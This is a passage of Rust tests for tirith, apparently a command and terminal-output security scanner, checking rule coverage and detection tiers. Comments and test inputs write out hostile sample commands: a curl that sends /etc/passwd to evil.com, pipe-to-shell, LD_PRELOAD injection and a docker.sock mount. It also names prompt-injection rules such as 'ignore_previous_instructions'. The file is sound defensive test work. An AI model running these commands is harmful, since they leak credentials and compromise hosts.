            let verdict = analyze_output(&fixture.input, OutputContext::default());
            let expected = match fixture.expected_action.as_str() {
                "allow" => Action::Allow,
                "warn" => Action::Warn,
                "block" => Action::Block,
                other => panic!(
                    "Unknown expected_action '{}' in output fixture {}",
                    other, fixture.name
                ),
            };
            assert_eq!(
                verdict.action,
                expected,
                "output fixture '{}': expected {:?} got {:?}; findings = {:?}",
                fixture.name,
                expected,
                verdict.action,
                verdict
                    .findings
                    .iter()
                    .map(|f| format!("{}: {}", f.rule_id, f.title))
                    .collect::<Vec<_>>()
            );

            let found_rules: Vec<String> = verdict
                .findings
                .iter()
                .map(|f| f.rule_id.to_string())
                .collect();
            for expected_rule in &fixture.expected_rules {
                assert!(
                    found_rules.contains(expected_rule),
                    "output fixture '{}': expected rule '{}' not found. Found: {:?}",
                    fixture.name,
                    expected_rule,
                    found_rules
                );
            }
            for forbidden in &fixture.forbidden_rules {
                assert!(
                    !found_rules.contains(forbidden),
                    "output fixture '{}': forbidden rule '{}' was found. Findings: {:?}",
                    fixture.name,
                    forbidden,
                    found_rules
                );
            }
        }
        eprintln!("Passed {count} output fixtures ({file})");
    }
}

/// Pins `output.toml` coverage for the 6 output + 2 prompt-injection rules.
#[test]
fn test_output_rule_ids_have_fixture_coverage() {
    let covered = collect_output_fixture_rules();
    let required = [
        // M7 ch1
        "output_osc52_clipboard_write",
        "output_hidden_text",
        "output_fake_prompt",
        "output_terminal_hyperlink_mismatch",
        "output_title_manipulation",
        "output_clear_screen",
        // M7 ch5
        "prompt_injection_in_output",
        "ignore_previous_instructions",
        "prompt_injection_obfuscated",
        // C7
        "output_data_exfiltration",
    ];
    let missing: Vec<&str> = required
        .iter()
        .copied()
        .filter(|r| !covered.contains(*r))
        .collect();
    assert!(
        missing.is_empty(),
        "Output-direction rules missing fixture coverage in tests/fixtures/output.toml:\n{}",
        missing
            .iter()
            .map(|r| format!("  - {r}"))
            .collect::<Vec<_>>()
            .join("\n")
    );
}

#[test]
fn test_all_rule_ids_have_fixture_coverage() {
    let covered = collect_fixture_rules();
    let excluded: HashSet<&str> = EXTERNALLY_TRIGGERED_RULES.iter().copied().collect();

    let missing: Vec<&&str> = ALL_RULE_IDS
        .iter()
        .filter(|id| !excluded.contains(**id))
        .filter(|id| !covered.contains(**id))
        .collect();

    assert!(
        missing.is_empty(),
        "RuleId variants with NO golden fixture coverage (add at least one fixture per rule):\n{}",
        missing
            .iter()
            .map(|id| format!("  - {id}"))
            .collect::<Vec<_>>()
            .join("\n")
    );
}

/// Generate the canonical [`RuleId`] variant list AND a compile-time
/// exhaustiveness guard from a single source: `_rule_id_exhaustive`'s `match`
/// (no `_` arm) fails to compile if a new enum variant isn't listed here, so the
/// returned list is genuinely enum-derived rather than a drift-prone `vec!`.
macro_rules! rule_id_variant_registry {
    ($($variant:ident),+ $(,)?) => {
        /// Every `RuleId` variant; completeness enforced by `_rule_id_exhaustive`.
        fn all_rule_id_variants() -> Vec<tirith_core::verdict::RuleId> {
            use tirith_core::verdict::RuleId;
            vec![ $(RuleId::$variant),+ ]
        }

        /// Compile-time completeness guard (exhaustive match, no `_` arm).
        #[allow(dead_code)]
        fn _rule_id_exhaustive(r: tirith_core::verdict::RuleId) {
            use tirith_core::verdict::RuleId;
            match r { $(RuleId::$variant => {}),+ }
        }
    };
}

rule_id_variant_registry! {
    NonAsciiHostname, PunycodeDomain, MixedScriptInLabel, UserinfoTrick,
    ConfusableDomain, RawIpUrl, NonStandardPort, InvalidHostChars,
    TrailingDotWhitespace, LookalikeTld, NonAsciiPath, HomoglyphInPath,
    DoubleEncoding, PlainHttpToSink, SchemelessToSink, InsecureTlsFlags,
    ShortenedUrl, AnsiEscapes, ControlChars, BidiControls,
    ZeroWidthChars, HiddenMultiline, UnicodeTags, InvisibleMathOperator,
    VariationSelector, InvisibleWhitespace, HangulFiller, ConfusableText,
    PipeToInterpreter, CurlPipeShell, WgetPipeShell, HttpiePipeShell,
    XhPipeShell, DotfileOverwrite, ArchiveExtract, ProcMemAccess,
    DockerRemotePrivEsc, CredentialFileSweep, Base64DecodeExecute, DataExfiltration,
    WrapperChainTooDeep,
    PsSetExecutionPolicyBypass, PsDefenderExclusion, PsInlineDownloadExecute, DynamicCodeExecution,
    ObfuscatedPayload, SuspiciousCodeExfiltration, ProxyEnvSet, SensitiveEnvExport,
    CodeInjectionEnv, InterpreterHijackEnv, ShellInjectionEnv, MetadataEndpoint,
    PrivateNetworkAccess, CommandNetworkDeny, ConfigInjection, ConfigSuspiciousIndicator,
    ConfigMalformed, ConfigNonAscii, ConfigInvisibleUnicode, McpInsecureServer,
    McpUntrustedServer, McpDuplicateServerName, McpOverlyPermissive, McpSuspiciousArgs,
    McpServerDrift, GitTyposquat, DockerUntrustedRegistry, PipUrlInstall,
    NpmUrlInstall, Web3RpcEndpoint, Web3AddressInUrl, VetNotConfigured,
    // Install-command rules
    RepoAddFromPipe, UnsignedRepoTrust, GpgCheckDisabled, KubectlApplyRemote,
    HelmUntrustedRepo, TerraformRemoteModule, BrewUntrustedTap,
    // CI / repo supply-chain scan rules
    WorkflowUnpinnedAction, WorkflowDangerousTrigger, WorkflowCurlPipeShell, WorkflowUntrustedInput,
    DockerfileUnpinnedImage, PackageScriptDangerous,
    // AI-relevant file hidden-content scan rules
    NotebookHiddenContent, NotebookSuspiciousOutput, AgentInstructionHidden, SvgScriptEmbedded,
    SvgExternalReference,
    // Threat intelligence — local DB
    ThreatMaliciousPackage, ThreatMaliciousIp, ThreatPackageTyposquat, ThreatPackageSimilarName,
    ThreatUnresolvedMaliciousPackage,
    // Threat intelligence — supplemental feeds
    ThreatMaliciousUrl, ThreatPhishingUrl, ThreatTorExitNode, ThreatThreatFoxIoc,
    // Threat intelligence — real-time lookups
    ThreatOsvVulnerable, ThreatCisaKev, ThreatSuspiciousPackage, ThreatSafeBrowsing,
    // Package reputation rules (M6 ch6)
    PackageNotFoundInRegistry, PackageMaintainerChangeRecent, PackageOwnershipTransferred,
    PackageOsvAdvisoryActive, PackageDependencyConfusion, PackageInstallScriptNetworkCall,
    PackageRepoMismatch,
    // Package-policy gated rules (M6 ch7)
    PackagePolicyNewerThanDays, PackagePolicyLowDownloads, PackagePolicyTyposquatDistance,
    PackagePolicyUnknownPackageWithInstallScripts, PackagePolicyNotFound,
    // Rendered content
    HiddenCssContent, HiddenColorContent, HiddenHtmlAttribute, MarkdownComment, HtmlComment,
    // Credential
    CredentialInText, HighEntropySecret, PrivateKeyExposed,
    // Cloaking / clipboard / pdf / policy / custom / license
    ServerCloaking, ClipboardHidden, PdfHiddenText, CustomRuleMatch, PolicyBlocklisted,
    AgentDeniedByPolicy, LicenseRequired,
    // Output-direction rules (M7 ch1)
    OutputOsc52ClipboardWrite, OutputHiddenText, OutputFakePrompt, OutputTerminalHyperlinkMismatch,
    OutputTitleManipulation, OutputClearScreen, OutputTruncatedEscapeSequence,
    // Prompt-injection rules (M7 ch5)
    PromptInjectionInOutput, IgnorePreviousInstructions, PromptInjectionObfuscated,
    // Output-side data-exfiltration rule (C7)
    OutputDataExfiltration,
    // Operational-context rules (M8 ch1)
    ContextProdDestructiveCommand, ContextProdWriteOperation, ContextProdCredentialChange,
    // SSH operational-context rules (M8 ch2)
    SshRemoteDestructiveOnLabeledHost, SshRemoteShellOnLabeledHost,
    // IaC operational-context rules (M8 ch3)
    IacApplyWithoutPlan, IacApplyAutoApprove, IacApplyAutoApproveProd, IacDestroyProd,
    IacPlanHighRiskChanges, IacPlanHashMismatch,
    // Sudo-escalation rules (M8 ch4)
    SudoShellSpawn, SudoEnvPreserveSensitive, SudoTeeSystemFile, SudoDownloadInstall,
    SudoRecursivePermsBroadPath,
    // Container-runtime rules (M8 ch5)
    DockerRunPrivileged, DockerRunSensitiveBindMount, DockerExecProdContainer,
    // Workstation hygiene rules (M9 ch1)
    HygienePrivateKeyLoosePerms, HygieneEnvWorldReadable, HygieneKubeconfigGroupReadable,
    HygieneNpmrcPlaintextToken, HygienePypircPlaintextToken, HygieneSshConfigUnsafeInclude,
    HygieneGitCredentialHelperStore, HygieneShellHistorySecretLike, HygieneCloudCredsBadPerms,
    HygieneDbDumpInRepo,
    // Persistence-mechanism state-change rules (M9 ch2)
    PersistenceShellRcModified, PersistenceAuthorizedKeysNewEntry, PersistenceCrontabModified,
    PersistenceLaunchAgentAdded, PersistenceSshConfigInclude, PersistenceDirenvNewEnvrc,
    // Shell-alias / function risk rules (M9 ch3)
    AliasOverridesCriticalCommand, AliasContainsNetworkCall, AliasContainsCredentialRead,
    AliasRecentlyAdded,
    // Environment-variable lifecycle rules (M9 ch4)
    EnvSensitiveExposedToUnknownScript, EnvSensitivePersistedInShellRc, EnvPrintenvToNetworkSink,
    // Executable-provenance + PATH-shadowing rules (M9 ch5)
    ExecInTmp, ExecRecentlyModified, ExecWorldWritable, ExecShadowsSystemCommand,
    ExecUnsigned, ExecInRepoBin, PathWritableDirBeforeSystem, PathDuplicateCommandName,
    PathDirInRepo, PathDirInTmp,
    // Repo-hook / automation guard rules (M9 ch6)
    RepoHookNetworkCall, RepoHookCredentialRead, RepoHookSudo, RepoHookSuspiciousShellPattern,
    RepoHookExternalFetch,
    // Blast-radius rules (M10 ch1)
    BlastDeletesOutsideRepo, BlastWritesSystemPath, BlastSymlinkTraversal, BlastEmptyVarGlob,
    BlastFindDelete, BlastRsyncDelete, BlastLargeFileCount,
    // Post-run diff rule (M10 ch2)
    PostRunShellRcModified,
    // Tainted-content tracking rules (M10 ch3)
    ExecOfTaintedFile, CommandSourcedFromTaintedFile,
    // Anomaly-detection rules (M10 ch5, D2)
    AnomalyFirstTimeInThisRepo, AnomalyRareInBaseline,
    // Command-card attestation rules (M11 ch1)
    CommandCardVerified, CommandCardUnverified, CommandCardMismatch,
    // Repo command-manifest rules (M11 ch2)
    RepoCommandUnknown, RepoCommandDangerousPattern,
    // Honeytoken / canary rule (M11 ch3, D3)
    CanaryTokenTouched,
    // Paste-provenance rule (M12 ch1)
    PasteSourceMismatch,
    // AI-config drift rules (M13 ch5)
    AiConfigHiddenInstructionAdded, AiConfigToolUseEscalation,
    // Cross-event correlation rules (W7)
    SecretWriteThenNetwork, DependencyChangeThenNetwork, DeleteThenForcePush, MassFileDeletion,
    // Scan-coverage incompleteness (A2)
    AnalysisIncomplete,
}

/// Verify ALL_RULE_IDS stays in sync with the RuleId enum (the variant count is
/// enum-derived via the compile-time-enforced [`all_rule_id_variants`]).
#[test]
fn test_rule_id_list_is_complete() {
    let all_variants = all_rule_id_variants();
    let all_rule_set: HashSet<&str> = ALL_RULE_IDS.iter().copied().collect();

    for variant in &all_variants {
        let serialized = variant.to_string();
        assert!(
            all_rule_set.contains(serialized.as_str()),
            "RuleId::{variant:?} serializes to '{serialized}' but is missing from ALL_RULE_IDS constant"
        );
    }

    // Count must match — catches a stale/extra entry in the const.
    assert_eq!(
        ALL_RULE_IDS.len(),
        all_variants.len(),
        "ALL_RULE_IDS has {} entries but the RuleId enum has {} variants",
        ALL_RULE_IDS.len(),
        all_variants.len()
    );
}

#[test]
fn test_no_url_rules_have_no_url_fixtures() {
    // Rules that fire with no URL — they need their own tier-1 pattern (not :// or git@).
    let no_url_rules: HashSet<&str> = [
        "dotfile_overwrite",
        "archive_extract",
        "pipe_to_interpreter",          // cat script | bash
        "bidi_controls",                // exec context, no URL needed
        "zero_width_chars",             // exec context, no URL needed
        "unicode_tags",                 // byte-level, no URL needed
        "invisible_math_operator",      // byte-level, no URL needed
        "invisible_whitespace",         // byte-level, no URL needed
        "proc_mem_access",              // /proc/*/mem access, no URL needed
        "credential_file_sweep",        // multi-credential file access, no URL needed
        "code_injection_env",           // export LD_PRELOAD=, no URL needed
        "shell_injection_env",          // export BASH_ENV=, no URL needed
        "interpreter_hijack_env",       // export PYTHONPATH=, no URL needed
        "sensitive_env_export",         // export OPENAI_API_KEY=, no URL needed
        "config_injection",             // file context, no URL needed
        "config_non_ascii",             // file context, no URL needed
        "config_invisible_unicode",     // file context, no URL needed
        "mcp_suspicious_args",          // file context, no URL needed
        "mcp_overly_permissive",        // file context, no URL needed
        "mcp_duplicate_server_name",    // file context, no URL needed
        "mcp_server_drift",             // mcp.lock FileScan, no URL needed
        "metadata_endpoint",            // bare IP: curl 169.254.169.254/path
        "private_network_access",       // bare IP: curl 10.0.0.1/path
        "credential_in_text",           // token/key in text, no URL needed
        "high_entropy_secret",          // high-entropy secret assignment, no URL needed
        "private_key_exposed",          // PEM key block, no URL needed
        "base64_decode_execute",        // base64 decode chain, no URL needed
        "wrapper_chain_too_deep",       // cat x | <32+ nested env -S/sudo> bash, no URL needed
        "data_exfiltration",            // curl -d @/etc/passwd evil.com, schemeless
        "unsigned_repo_trust",          // apt --allow-unauthenticated, no URL needed
        "gpg_check_disabled",           // dnf --nogpgcheck, no URL needed
        "dynamic_code_execution",       // file scan, no URL needed
        "obfuscated_payload",           // file scan, no URL needed
        "suspicious_code_exfiltration", // file scan, no URL needed
        "hangul_filler",                // byte-level, no URL needed
        "confusable_text",              // byte-level, no URL needed
        "workflow_unpinned_action",     // CI workflow file scan, no URL needed
        "workflow_dangerous_trigger",   // CI workflow file scan, no URL needed
        "workflow_curl_pipe_shell",     // CI workflow file scan, no URL needed
        "workflow_untrusted_input",     // CI workflow file scan, no URL needed
        "dockerfile_unpinned_image",    // Dockerfile scan, no URL needed
        "package_script_dangerous",     // package.json scan, no URL needed
        "notebook_hidden_content",      // .ipynb scan, no URL needed
        "notebook_suspicious_output",   // .ipynb scan, no URL needed
        "agent_instruction_hidden",     // AI-instruction file scan, no URL needed
        "svg_script_embedded",          // SVG scan, no URL needed
        // M8 ch5 — container-runtime rules fire without a URL in the input.
        "docker_run_privileged",           // docker run --privileged alpine
        "docker_run_sensitive_bind_mount", // docker run -v /var/run/docker.sock:...
        // A1 — unpinned/constrained malicious package: npm install evil-package
        "threat_unresolved_malicious_package",
    ]
    .into_iter()
    .collect();

    fn input_has_url(input: &str) -> bool {
        input.contains("://") || input.contains("git@")
    }

    let all_fixtures = load_all_fixtures();

    let mut has_no_url_fixture: HashSet<String> = HashSet::new();
    for (_, fixture) in &all_fixtures {
        if fixture.expected_action == "allow" {
            continue;
        }
        if !input_has_url(&fixture.input) {
            for rule in &fixture.expected_rules {
                has_no_url_fixture.insert(rule.clone());
            }
        }
    }

    let missing: Vec<&&str> = no_url_rules
        .iter()
        .filter(|rule| !has_no_url_fixture.contains(**rule))
        .collect();

    assert!(
        missing.is_empty(),
        "Non-URL-dependent rules that lack a no-URL fixture (tier-1 gap risk):\n{}",
        missing
            .iter()
            .map(|r| format!("  - {r}"))
            .collect::<Vec<_>>()
            .join("\n")
    );
}

#[test]
fn test_extractor_ids_cover_rule_triggers() {
    let ids: HashSet<&str> = tirith_core::extract::extractor_ids()
        .iter()
        .copied()
        .collect();

    // Each rule category → the extractor IDs it needs to trigger tier-1.
    let required_extractors: Vec<(&str, &[&str])> = vec![
        // URL-based rules need at least one URL trigger
        ("hostname rules", &["standard_url"]),
        ("path rules", &["standard_url"]),
        (
            "transport rules",
            &[
                "standard_url",
                "curl",
                "wget",
                "httpie",
                "xh",
                "scp",
                "rsync",
            ],
        ),
        ("ecosystem rules", &["standard_url", "docker_command"]),
        // Command shape rules need their own patterns
        ("pipe-to-interpreter", &["pipe_to_interpreter"]),
        ("base64 decode-execute", &["base64_decode_execute"]),
        ("dotfile overwrite", &["dotfile_overwrite"]),
        ("archive extract", &["archive_extract_sensitive"]),
        ("install commands", &["install_command"]),
        // PowerShell rules
        (
            "powershell commands",
            &[
                "powershell_iwr",
                "powershell_irm",
                "powershell_invoke_webrequest",
                "powershell_invoke_restmethod",
                "powershell_invoke_expression",
            ],
        ),
        // Environment variable detection
        (
            "env var detection",
            &["env_var_dangerous", "env_var_hijack", "env_var_sensitive"],
        ),
        // Network destination detection
        ("metadata endpoint", &["metadata_endpoint"]),
        ("proc_mem_access", &["proc_mem_access"]),
        ("docker_remote_privesc", &["docker_remote_privesc"]),
        ("credential_file_sweep", &["credential_file_sweep"]),
        // Deception triggers
        ("punycode detection", &["punycode_domain"]),
        ("lookalike TLD", &["lookalike_tld"]),
        ("URL shortener", &["url_shortener"]),
        // Credential detection
        (
            "credential detection",
            &[
                "credential_known",
                "credential_private_key",
                "credential_generic",
            ],
        ),
    ];

    let mut missing = Vec::new();
    for (category, required) in &required_extractors {
        for extractor_id in *required {
            if !ids.contains(extractor_id) {
                missing.push(format!(
                    "{category}: missing extractor '{extractor_id}' in PATTERN_TABLE"
                ));
            }
        }
    }

    assert!(
        missing.is_empty(),
        "PATTERN_TABLE in build.rs is missing extractors needed by rule categories:\n{}",
        missing.join("\n  ")
    );
}

#[test]
fn test_tier1_does_not_gate_findings() {
    let all_fixtures = load_all_fixtures();
    let mut gated = Vec::new();

    for (file, fixture) in &all_fixtures {
        if fixture.expected_action == "allow" {
            continue;
        }

        let shell = fixture
            .shell
            .parse::<ShellType>()
            .unwrap_or(ShellType::Posix);

        let scan_context = match fixture.context.as_str() {
            "exec" => ScanContext::Exec,
            "paste" => ScanContext::Paste,
            "file" => ScanContext::FileScan,
            _ => continue,
        };

        let raw_bytes = if !fixture.raw_bytes.is_empty() {
            Some(fixture.raw_bytes.clone())
        } else if scan_context == ScanContext::Paste || scan_context == ScanContext::FileScan {
            Some(fixture.input.as_bytes().to_vec())
        } else {
            None
        };

        let file_path = fixture.file_path.as_ref().map(std::path::PathBuf::from);

        let ctx = AnalysisContext {
            input: fixture.input.clone(),
            shell,
            scan_context,
            raw_bytes,
            interactive: true,
            cwd: None,
            file_path,
            repo_root: None,
            is_config_override: false,
            clipboard_html: None,
            card_ref: None,
            clipboard_source: tirith_core::clipboard::ClipboardSourceState::AbsentOrInvalid,
        };

        let verdict = engine::analyze(&ctx);

        if verdict.tier_reached < 3 {
            gated.push(format!(
                "{file}:{} — tier_reached={}, expected_action={}, input={:?}",
                fixture.name, verdict.tier_reached, fixture.expected_action, fixture.input
            ));
        }
    }

    assert!(
        gated.is_empty(),
        "Tier-1 gated {} fixture(s) that should produce findings (security bug!):\n  {}",
        gated.len(),
        gated.join("\n  ")
    );
}

/// Non-ASCII in paste is only an analysis trigger: a paste of non-ASCII alone
/// (no URLs/commands) must resolve to Allow.
#[test]
fn test_non_ascii_paste_not_sole_warn() {
    let non_ascii_inputs = [
        "café au lait",
        "日本語テスト",
        "Ünïcödé",
        "こんにちは世界",
        "مرحبا",
        // #126: Japanese with an embedded Latin word + ideographic period / fullwidth Latin.
        "Rustを使う。",
        "RustのＡＰＩを呼ぶ",
        // #134: a local path whose filename segment is a non-English (Cyrillic) word.
        "/tmp/backup_сервер.log",
    ];

    for input in &non_ascii_inputs {
        let raw_bytes = input.as_bytes().to_vec();
        let ctx = AnalysisContext {
            input: input.to_string(),
            shell: ShellType::Posix,
            scan_context: ScanContext::Paste,
            raw_bytes: Some(raw_bytes),
            interactive: true,
            cwd: None,
            file_path: None,
            repo_root: None,
            is_config_override: false,
            clipboard_html: None,
            card_ref: None,
            clipboard_source: tirith_core::clipboard::ClipboardSourceState::AbsentOrInvalid,
        };
        let verdict = engine::analyze(&ctx);
        assert_eq!(
            verdict.action,
            Action::Allow,
            "Non-ASCII paste '{}' should not produce WARN/BLOCK by itself, got {:?} with findings: {:?}",
            input,
            verdict.action,
            verdict.findings.iter().map(|f| &f.rule_id).collect::<Vec<_>>()
        );
    }
}

/// The tier-1 regex must match every name in the shared `INTERPRETERS`
/// constant — drift between the tier-1 gate (build.rs) and the tier-3
/// detection (command.rs) would silently gate real attacks.
#[test]
fn test_tier1_matches_all_interpreters() {
    use tirith_core::extract::{tier1_scan, ScanContext};
    use tirith_core::rules::command::INTERPRETERS;

    for name in INTERPRETERS {
        let input = format!("cat /tmp/s.sh | {}", name);
        assert!(
            tier1_scan(&input, ScanContext::Exec),
            "Tier-1 scan does not match plain interpreter '{}' in '{}'",
            name,
            input
        );
    }

    assert!(
        tier1_scan("cat /tmp/s.sh | 'sudo' bash", ScanContext::Exec),
        "Tier-1 scan must match quoted wrapper 'sudo'"
    );
    assert!(
        tier1_scan(r#"cat /tmp/s.sh | "env" bash"#, ScanContext::Exec),
        "Tier-1 scan must match quoted wrapper \"env\""
    );

    assert!(
        tier1_scan("cat /tmp/s.sh | command sudo bash", ScanContext::Exec),
        "Tier-1 scan must match wrapper chain"
    );

    assert!(
        tier1_scan("cat /tmp/s.sh | $'bash'", ScanContext::Exec),
        "Tier-1 scan must match ANSI-C quoted interpreter"
    );

    assert!(
        tier1_scan("cat /tmp/s.sh | BASH", ScanContext::Exec),
        "Tier-1 scan must match uppercase interpreter"
    );
}

// Lab corpus safeguard: the `tirith lab` corpus (in the sibling `tirith` crate)
// doubles as a fixture set — every non-allow scenario must reach tier-3 and
// produce a finding, catching the `test_tier1_does_not_gate_findings` bug class.

#[derive(Debug, Deserialize)]
struct LabCorpusFile {
    #[serde(rename = "scenario")]
    scenarios: Vec<LabScenario>,
}

#[derive(Debug, Deserialize)]
#[allow(dead_code)]
struct LabScenario {
    name: String,
    description: String,
    input: String,
    context: String,
    #[serde(default = "default_lab_shell")]
    shell: String,
    expected_action: String,
    #[serde(default)]
    tags: Vec<String>,
    #[serde(default)]
    raw_bytes: Vec<u8>,
}

fn default_lab_shell() -> String {
    "posix".to_string()
}

#[test]
fn test_lab_corpus_reaches_tier3() {
    // Walk from `crates/tirith-core` into the sibling `tirith` crate's corpus.
    let path = PathBuf::from(env!("CARGO_MANIFEST_DIR"))
        .parent()
        .unwrap()
        .join("tirith")
        .join("assets")
        .join("lab_corpus.toml");
    let content = fs::read_to_string(&path)
        .unwrap_or_else(|e| panic!("Failed to read {}: {}", path.display(), e));
    let file: LabCorpusFile = toml::from_str(&content)
        .unwrap_or_else(|e| panic!("Failed to parse {}: {}", path.display(), e));

    assert!(
        !file.scenarios.is_empty(),
        "lab_corpus.toml must define at least one scenario"
    );

    for scenario in &file.scenarios {
        // Shared `FromStr` impls (one parse table with `cli/lab.rs`); panic-on-unknown.
        let shell: ShellType = scenario.shell.parse().unwrap_or_else(|_| {
            panic!(
                "Lab scenario '{}': unknown shell '{}'",
                scenario.name, scenario.shell
            )
        });

        let scan_context: ScanContext = scenario.context.parse().unwrap_or_else(|_| {
            panic!(
                "Lab scenario '{}': unknown context '{}'",
                scenario.name, scenario.context
            )
        });

        let raw_bytes = match (scenario.raw_bytes.as_slice(), scan_context) {
            // Mirror `run_fixture`'s fallback: default raw bytes from input for
            // Paste and FileScan so they exercise the same byte path.
            ([], ScanContext::Paste | ScanContext::FileScan) => {
                Some(scenario.input.as_bytes().to_vec())
            }
            ([], _) => None,
            (bytes, _) => Some(bytes.to_vec()),
        };

        let ctx = AnalysisContext {
            input: scenario.input.clone(),
            shell,
            scan_context,
            raw_bytes,
            interactive: true,
            cwd: None,
            file_path: None,
            repo_root: None,
            is_config_override: false,
            clipboard_html: None,
            card_ref: None,
            clipboard_source: tirith_core::clipboard::ClipboardSourceState::AbsentOrInvalid,
        };

        let verdict = engine::analyze(&ctx);

        let expected: Action = scenario.expected_action.parse().unwrap_or_else(|_| {
            panic!(
                "Lab scenario '{}': unknown expected_action '{}'",
                scenario.name, scenario.expected_action
            )
        });

        // Bucket Warn/WarnAck together — both are user-visible warnings.
        let action_bucket = |a: Action| match a {
            Action::Warn | Action::WarnAck => Action::Warn,
            other => other,
        };
        assert_eq!(
            action_bucket(verdict.action),
            expected,
            "Lab scenario '{}': expected {:?} but engine returned {:?} ({} findings)",
            scenario.name,
            expected,
            verdict.action,
            verdict.findings.len()
        );

        // Core safeguard: a non-allow scenario must reach tier-3 AND produce a
        // finding, catching a refactor that gates a rule out of the hot path.
        if expected != Action::Allow {
            // Pin tier-3 explicitly (not just "some finding exists" — a byte-scan
            // finding could otherwise mask a tier-1/2 gating regression).
            assert!(
                verdict.tier_reached >= 3,
                "Lab scenario '{}' (expected {:?}): engine reached tier {} but the corpus requires tier-3 coverage",
                scenario.name,
                expected,
                verdict.tier_reached,
            );
            assert!(
                !verdict.findings.is_empty(),
                "Lab scenario '{}' (expected {:?}): tier-3 produced no findings — corpus has lost detection coverage",
                scenario.name,
                expected
            );
        }
    }
}

// M8 ch1 — context-rule integration tests. Exercise the block path by seeding a
// fake kube context (`KUBECONFIG`) + a context-labels file under a temp repo
// (`TIRITH_POLICY_ROOT` + a fake `.git` boundary). Serialized on a file-scope
// mutex (the crate's `TEST_ENV_LOCK` isn't reachable from integration tests).

static CONTEXT_TEST_LOCK: std::sync::Mutex<()> = std::sync::Mutex::new(());

#[test]
fn context_rule_blocks_kubectl_delete_in_labeled_prod() {
    let _lock = CONTEXT_TEST_LOCK.lock().unwrap_or_else(|p| p.into_inner());

    let dir = tempfile::tempdir().unwrap();

    // Fake kubeconfig with current-context: prod-us-east.
    let kube_path = dir.path().join("kubeconfig");
    fs::write(
        &kube_path,
        "apiVersion: v1\nkind: Config\ncurrent-context: prod-us-east\n",
    )
    .unwrap();

    // Fake .git boundary + .tirith/ with a policy + a labels file marking
    // `prod-us-east` critical.
    fs::create_dir_all(dir.path().join(".git")).unwrap();
    let tirith_dir = dir.path().join(".tirith");
    fs::create_dir_all(&tirith_dir).unwrap();
    fs::write(
        tirith_dir.join("policy.yaml"),
        "context_guard_enabled: true\n",
    )
    .unwrap();
    fs::write(
        tirith_dir.join("context-labels.yaml"),
        "kube:prod-us-east: critical\n",
    )
    .unwrap();

    // SAFETY: serialized via TEST_ENV_LOCK. Set both env vars before touching
    // the engine; the disable env MUST be unset here.
    unsafe {
        std::env::set_var("KUBECONFIG", kube_path.display().to_string());
        std::env::set_var("TIRITH_POLICY_ROOT", dir.path().display().to_string());
        std::env::remove_var("TIRITH_CONTEXT_DETECT_DISABLE");
    }
    tirith_core::context_detect::clear_cache_for_tests();

    let ctx = AnalysisContext {
        input: "kubectl delete namespace payments".to_string(),
        shell: ShellType::Posix,
        scan_context: ScanContext::Exec,
        raw_bytes: None,
        interactive: true,
        cwd: Some(dir.path().display().to_string()),
        file_path: None,
        repo_root: None,
        is_config_override: false,
        clipboard_html: None,
        card_ref: None,
        clipboard_source: tirith_core::clipboard::ClipboardSourceState::AbsentOrInvalid,
    };

    let verdict = engine::analyze(&ctx);

    // Clean up env BEFORE asserting so a failure doesn't pollute the environment.
    unsafe {
        std::env::remove_var("KUBECONFIG");
        std::env::remove_var("TIRITH_POLICY_ROOT");
    }
    tirith_core::context_detect::clear_cache_for_tests();

    let context_finding = verdict.findings.iter().find(|f| {
        matches!(
            f.rule_id,
            tirith_core::verdict::RuleId::ContextProdDestructiveCommand
        )
    });
    assert!(
        context_finding.is_some(),
        "expected ContextProdDestructiveCommand finding; got: {:?}",
        verdict
            .findings
            .iter()
            .map(|f| format!("{}: {}", f.rule_id, f.title))
            .collect::<Vec<_>>(),
    );
    assert_eq!(verdict.action, Action::Block);
}

#[test]
fn context_rule_allows_kubectl_get_in_labeled_prod() {
    let _lock = CONTEXT_TEST_LOCK.lock().unwrap_or_else(|p| p.into_inner());

    let dir = tempfile::tempdir().unwrap();
    let kube_path = dir.path().join("kubeconfig");
    fs::write(
        &kube_path,
        "apiVersion: v1\nkind: Config\ncurrent-context: prod-us-east\n",
    )
    .unwrap();
    fs::create_dir_all(dir.path().join(".git")).unwrap();
    let tirith_dir = dir.path().join(".tirith");
    fs::create_dir_all(&tirith_dir).unwrap();
    fs::write(
        tirith_dir.join("policy.yaml"),
        "context_guard_enabled: true\n",
    )
    .unwrap();
    fs::write(
        tirith_dir.join("context-labels.yaml"),
        "kube:prod-us-east: critical\n",
    )
    .unwrap();

    unsafe {
        std::env::set_var("KUBECONFIG", kube_path.display().to_string());
        std::env::set_var("TIRITH_POLICY_ROOT", dir.path().display().to_string());
        std::env::remove_var("TIRITH_CONTEXT_DETECT_DISABLE");
    }
    tirith_core::context_detect::clear_cache_for_tests();

    let ctx = AnalysisContext {
        input: "kubectl get pods -n payments".to_string(),
        shell: ShellType::Posix,
        scan_context: ScanContext::Exec,
        raw_bytes: None,
        interactive: true,
        cwd: Some(dir.path().display().to_string()),
        file_path: None,
        repo_root: None,
        is_config_override: false,
        clipboard_html: None,
        card_ref: None,
        clipboard_source: tirith_core::clipboard::ClipboardSourceState::AbsentOrInvalid,
    };

    let verdict = engine::analyze(&ctx);

    unsafe {
        std::env::remove_var("KUBECONFIG");
        std::env::remove_var("TIRITH_POLICY_ROOT");
    }
    tirith_core::context_detect::clear_cache_for_tests();

    let context_findings: Vec<_> = verdict
        .findings
        .iter()
        .filter(|f| {
            matches!(
                f.rule_id,
                tirith_core::verdict::RuleId::ContextProdDestructiveCommand
                    | tirith_core::verdict::RuleId::ContextProdWriteOperation
                    | tirith_core::verdict::RuleId::ContextProdCredentialChange
            )
        })
        .collect();
    assert!(
        context_findings.is_empty(),
        "read-only kubectl get must NOT fire any context rule; got: {:?}",
        context_findings
            .iter()
            .map(|f| f.rule_id.to_string())
            .collect::<Vec<_>>()
    );
}

// M8 ch2 — SSH context-rule integration tests. Mirror of M8 ch1: seed a temp
// `.tirith/ssh-host-labels.yaml` under a fake `.git`, then assert the rule blocks
// destructive inner commands and emits Info (→ Allow) for the bare-ssh case.

#[test]
fn ssh_rule_blocks_destructive_on_labeled_host() {
    let _lock = CONTEXT_TEST_LOCK.lock().unwrap_or_else(|p| p.into_inner());

    let dir = tempfile::tempdir().unwrap();
    fs::create_dir_all(dir.path().join(".git")).unwrap();
    let tirith_dir = dir.path().join(".tirith");
    fs::create_dir_all(&tirith_dir).unwrap();
    // SSH host-labels file with payments-prod-01 = critical.
    fs::write(
        tirith_dir.join("ssh-host-labels.yaml"),
        "payments-prod-01: critical\n",
    )
    .unwrap();

